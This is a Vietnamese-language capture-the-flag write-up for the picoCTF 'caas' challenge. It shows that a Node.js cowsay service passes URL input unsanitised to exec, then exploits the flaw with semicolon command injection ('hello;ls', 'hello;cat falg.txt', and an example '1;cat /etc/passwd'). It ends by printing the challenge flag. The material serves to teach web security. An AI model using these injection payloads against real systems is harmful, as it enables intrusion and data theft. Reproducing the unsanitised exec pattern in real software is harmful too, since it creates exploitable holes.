# Write-up : caas
---
### Description :
> Now presenting cowsay as a service
> file index.js
### Hint :
> none
---
### Solution :
Tải file về và mở ra thì đọc qua chúng ta có thể thấy có import các lệnh của linux vào ``` const { exec } = require('child_process'); ```
Khi vào trang web thì có được 1 đường link để chuyển đến `` con bò nói ``, khi vào đường dẫn ta có thể bắt con bò nói bằng cách thêm văn bản vào sau dấu `` / `` của `` https://caas.mars.picoctf.net/cowsay/{message} ``
Quay lại với việc đọc code thì chúng ta lại tìm ra điểm để khai thác sau khi có phần import các câu lệnh linux phía trên : ```  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) ```
Dễ dàng thấy ``` ${req.params.message} ``` không kiểm tra dữ liệu đầu vào
- Vậy chúng ta có thể sử dụng các câu lệnh linux
??? Vậy chúng ta dùng các câu lệnh như nào ???
- Như chúng ta đã biết thì muốn thực hiện lệnh thì phải phân cách giữa dữ liệu vào và câu lệnh mình muốn thực hiện, trong linux việc ngăn cách giữa 2 câu lệnh đó là xuống dòng hoạc dùng dấu `` ; ``
> giải thích : coi câu lệnh ${req.params.message} như 1 câu lệnh linux echo 1 và phần ${req.params.message} chính là số 1 trong câu lệnh echo đó, muốn thực hiện thêm 1 câu lệnh thì ta phải giúp linux phân biệt rõ 2 câu lệnh bằng dấu `` ; ``
> ví dụ : echo 1 và ta được nhập văn bản để in ra màn hình, nhưng 1 hacker thì không nhập như bình thường mà sẽ nhập là `` 1;cat /etc/passwd `` để thực hiện thêm 1 lệnh

Như vậy ta có thể áp dụng vào bài này, chúng ta sẽ nhập 1 văn bản bình thường là `` ; `` sau đó là câu lệnh ta muốn thực hiện
Trong bài này ta sẽ tìm file flag.txt và đọc nó thôi, vì thế chúng ta sẽ dùng lệnh `` ls `` . Chúng ta có payload là `` hello;ls `` 
Thu được kết quả là : 
```
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock
```
Á à ta đã thấy 1 file khá lạ và cũng rất quen đó là file : `` falg.txt `` 
Dùng lệnh cat để đọc : `` hello;cat falg.txt `` 
```
 _______
< hello >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```
### Flag : `` picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o} ``
